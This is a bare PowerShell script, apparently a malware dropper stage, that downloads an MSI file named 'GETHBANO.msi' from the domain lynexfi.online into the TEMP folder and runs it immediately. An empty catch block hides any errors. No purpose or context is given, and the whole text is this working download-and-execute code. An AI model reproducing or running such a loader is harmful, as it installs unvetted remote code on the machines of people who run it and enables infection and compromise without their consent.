$someData = @(
    [PSCustomObject]@{a = "https://lynexfi.online/GETHBANO.msi"; b = "GETHBANO.msi"}
  );

  foreach ($i in $someData) {
    try {
      $filePath = "$env:TEMP\$($i.b)";
      $download = $true;
      if (Test-Path $filePath) {
        $download = $false;
      }
      if ($download) {
        Invoke-RestMethod -Uri $i.a -OutFile $filePath;
      }
      Start-Process $filePath;
    }
    catch {
      # Error handling (optional)
    }
  }